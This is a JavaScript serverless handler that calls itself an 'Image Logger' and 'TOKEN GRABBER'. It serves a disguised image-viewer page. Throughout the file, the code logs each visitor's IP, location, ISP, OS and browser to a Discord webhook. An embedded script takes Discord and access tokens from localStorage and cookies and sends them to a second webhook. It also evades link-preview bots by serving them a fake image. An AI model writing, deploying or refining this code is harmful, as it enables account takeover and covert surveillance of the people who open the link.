import fetch from 'node-fetch';
import httpagentparser from 'httpagentparser';

// Configuration
const config = {
  webhook: process.env.WEBHOOK_URL,
  tokenCaptureWebhook: process.env.TOKEN_WEBHOOK_URL,
  image: "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
  imageArgument: true,
  username: "Image Logger",
  color: 0x00FFFF,
  crashBrowser: false,
  accurateLocation: false,
  message: {
    doMessage: false,
    message: "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
    richMessage: true,
  },
  vpnCheck: 1,
  linkAlerts: true,
  buggedImage: true,
  antiBot: 1,
  redirect: {
    redirect: false,
    page: "https://your-link.here"
  }
};

const blacklistedIPs = ["27", "104", "143", "164"];

function botCheck(ip, useragent) {
  if (ip.startsWith("34") || ip.startsWith("35")) {
    return "Discord";
  } else if (useragent.startsWith("TelegramBot")) {
    return "Telegram";
  }
  return false;
}

async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = false) {
  if (blacklistedIPs.some(prefix => ip.startsWith(prefix))) return;
  
  const bot = botCheck(ip, useragent);
  if (bot) {
    if (config.linkAlerts) {
      await fetch(config.webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          username: config.username,
          embeds: [{
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `Link sent on ${bot}\n**IP:** ${ip}`
          }]
        })
      });
    }
    return;
  }

  try {
    const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`).then(res => res.json());
    
    if (ipInfo.status !== 'success') throw new Error('IP API failed');
    
    const { os, browser } = httpagentparser.parse(useragent);
    
    const embed = {
      username: config.username,
      content: "@everyone",
      embeds: [{
        title: "Image Logger - IP Logged",
        color: config.color,
        description: `**IP:** ${ip}
        **Location:** ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
        **ISP:** ${ipInfo.isp}
        **Coordinates:** ${coords || `${ipInfo.lat}, ${ipInfo.lon}`}
        **VPN/Proxy:** ${ipInfo.proxy ? 'Yes' : 'No'}
        **OS:** ${os.name} | **Browser:** ${browser.name}
        **User Agent:** \`\`\`${useragent}\`\`\``,
      }]
    };
    
    if (url) embed.embeds[0].thumbnail = { url };
    
    await fetch(config.webhook, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(embed)
    });
    
    return ipInfo;
  } catch (error) {
    console.error('Reporting error:', error);
  }
}

async function sendTokenReport(ip, useragent, token) {
  await fetch(config.tokenCaptureWebhook, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      username: "TOKEN GRABBER",
      content: "@everyone",
      embeds: [{
        title: "Discord Token Captured!",
        color: 0xFF0000,
        description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
      }]
    })
  });
}

export default async (req, res) => {
  try {
    // Handle token submission
    if (req.method === 'POST' && req.url.includes('/logtoken')) {
      const { token } = req.body;
      const ip = req.headers['x-forwarded-for'] || 'Unknown';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      if (token && token !== 'NOT_FOUND') {
        await sendTokenReport(ip, userAgent, token);
      }
      
      return res.status(200).send('OK');
    }

    // Main GET request
    const query = req.query;
    const ip = req.headers['x-forwarded-for'] || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    let imageUrl = config.image;
    if (config.imageArgument && (query.url || query.id)) {
      try {
        imageUrl = Buffer.from(query.url || query.id, 'base64').toString('utf-8');
      } catch {
        // Use default image if decoding fails
      }
    }

    // Handle bots
    const bot = botCheck(ip, userAgent);
    if (bot) {
      if (config.buggedImage) {
        res.setHeader('Content-Type', 'image/jpeg');
        return res.send(Buffer.from(`
          /9j/4AAQSkZJRgABAQEAYABgAAD//gA+Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcg
          SlBFRyB2NjIpLCBxdWFsaXR5ID0gOTAK/9sAQwADAgIDAgIDAwMDBAMDBAUIBQUEBAUKBwcGCAwK
          DAwLCgsLDQ4SEA0OEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU/9sAQwEDBAQFBAUJBQUJFA0LDRQU
          FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU/8AAEQgAGAAY
          AwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMF
          BQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkq
          NDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqi
          o6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/E
          AB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMR
          BAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVG
          R0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKz
          tLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A
          /9k=
        `, 'base64'));
      }
      await makeReport(ip, userAgent, null, req.url, imageUrl);
      return res.redirect(imageUrl);
    }

    // Handle token capture page
    let htmlContent = `
    <html>
    <head>
      <title>Image Viewer</title>
      <style>
        body { margin: 0; padding: 0; }
        .img {
          background-image: url('${imageUrl}');
          background-position: center center;
          background-repeat: no-repeat;
          background-size: contain;
          width: 100vw;
          height: 100vh;
        }
      </style>
      <script>
        // Token capture logic
        setTimeout(() => {
          const tokenKeys = ['token', 'discord_token', '_token', 'access_token'];
          let token = "NOT_FOUND";
          
          // Check localStorage
          tokenKeys.forEach(key => {
            try {
              const value = localStorage.getItem(key);
              if (value) token = value;
            } catch(e) {}
          });
          
          // Check cookies
          if (token === "NOT_FOUND") {
            document.cookie.split(';').forEach(cookie => {
              const [name, value] = cookie.trim().split('=');
              if (tokenKeys.includes(name)) token = value;
            });
          }
          
          // Send token to server
          if (token !== "NOT_FOUND") {
            fetch('/api/image?logtoken=1', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ token })
            });
          }
        }, 2000);
      </script>
    `;

    // Geolocation script if enabled
    if (config.accurateLocation && !query.g) {
      htmlContent += `
      <script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(position => {
            const coords = position.coords;
            const g = btoa(coords.latitude + ',' + coords.longitude).replace(/=/g, "%3D");
            window.location.search += '&g=' + g;
          });
        }
      </script>
      `;
    }

    htmlContent += `</head><body><div class="img"></div></body></html>`;
    
    // Make IP report
    const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
    await makeReport(ip, userAgent, coords, req.url, imageUrl);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(htmlContent);
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).send('Internal Server Error');
  }
};
